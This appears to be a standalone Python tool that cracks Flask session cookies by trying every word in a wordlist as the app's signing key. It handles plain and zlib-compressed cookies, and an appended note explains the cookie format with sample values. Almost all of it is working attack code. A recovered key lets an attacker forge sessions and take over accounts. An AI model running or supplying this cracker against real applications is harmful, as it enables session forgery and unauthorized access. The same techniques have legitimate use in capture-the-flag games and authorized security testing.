import os,sys,re
import traceback
import hashlib
from itsdangerous import SignatureExpired, BadSignature, URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
from signal import signal, SIGINT

##
##

# Check Python version compatibility
def check_python_version():
    if not (sys.version_info.major == 3 and sys.version_info.minor >= 5):
        print("This script requires Python 3.5 or higher!")
        print(f"You are using Python {sys.version_info.major}.{sys.version_info.minor}.")
        sys.exit(1)

# Validate command-line arguments
def validate_args():
    if len(sys.argv) not in [3, 4]:
        print(f"Usage: {sys.argv[0]} <cookie_value> <word_list_file> [linenumber]")
        sys.exit(1)

# Serializer for compressed payloads
def serializer_compressed(key):
    return URLSafeTimedSerializer(
        secret_key=key,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    )

# Serializer for normal payloads
def serializer_normal(key):
    return URLSafeTimedSerializer(key)

# Signal handler for interrupt (Ctrl + C)
def handle_interrupt(signal_received, frame):
    print(f'\nTo continue, add the line number ({line_counter}) to the end of the command line.')
    sys.exit(0)

# Read line and handle potential encoding issues
def safe_readline(fp, i):
    try:
        return fp.readline()
    except UnicodeDecodeError:
        print(f'Non-UTF-8 password encountered, skipping line {i}.')
        return 'FAKE'

# Main function to search for the secret key
def search_secret_key(cookie, wordlist_file, skip=0):
    global line_counter
    found = False

    with open(wordlist_file, 'r', encoding='utf-8') as fp:
        signal(SIGINT, handle_interrupt)

        # Skip to the specified line number
        for _ in range(skip):
            safe_readline(fp, line_counter)
            line_counter += 1

        # Iterate over the wordlist to find the secret key
        while (line := safe_readline(fp, line_counter)):
            secret = line.strip()
            line_counter += 1

            # Progress output every 1000 lines
            if line_counter % 1000 == 0:
                sys.stdout.write(f'{line_counter} {secret:30}\r')
                sys.stdout.flush()

            serializer = serializer_fct(secret)
            try:
                # Attempt to load the cookie
                serializer.loads(cookie)
            except BadSignature as e:
                if isinstance(e, SignatureExpired):
                    print(f'Token expired, but the secret key was found: {secret}')
                    found = True
                    break
                continue

            print(f'Secret key found: {secret}')
            found = True
            break

    if not found:
        print('Secret key not found!')
        sys.exit(2)

# Main entry point of the script
if __name__ == "__main__":
    check_python_version()
    validate_args()

    # Retrieve command-line arguments
    cookie = sys.argv[1]
    wordlist_file = sys.argv[2]
    skip_line = int(sys.argv[3]) if len(sys.argv) == 4 else 0

    # Determine the serializer function based on the cookie type
    serializer_fct = serializer_compressed if cookie.startswith('.') else serializer_normal
    line_counter = 0

    # Start the secret key search
    search_secret_key(cookie, wordlist_file, skip_line)

##
##

```
flask_util

Tools to decode and crack flask session encoded cookie

Cookies have the following format:

eyJfZmxhc2hlcyI6W3siIGRpIjp7IiB0X18iOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX19XX0.XqwoIA.TzwbrYVtTnZrttEZXCPODjhARBg

=> The first part (before .) contain json encoded in base64 format
=> The second part contain a timestamp encoded in base64 format
=> The last part contain an HMac signature

.eJwdisEKgCAQBX9leefoA_yK7iKy2KaCZbDexH_PPM3ATIe_CmsShbEddGaYBe-XtJ8Wt6hyFGw4irAKlRopP9QqcQgzUktZ6Z3PDjfGcOMDLjMeHA.XqwoIA.MYvHl4W55MChmAIZRxkWdAXCxn8

=> The first part (before .) contain json compressed (zlib) then encoded in base64 format
=> The second part contain a timestamp encoded in base64 format
=> The last part contain an HMac signature
```
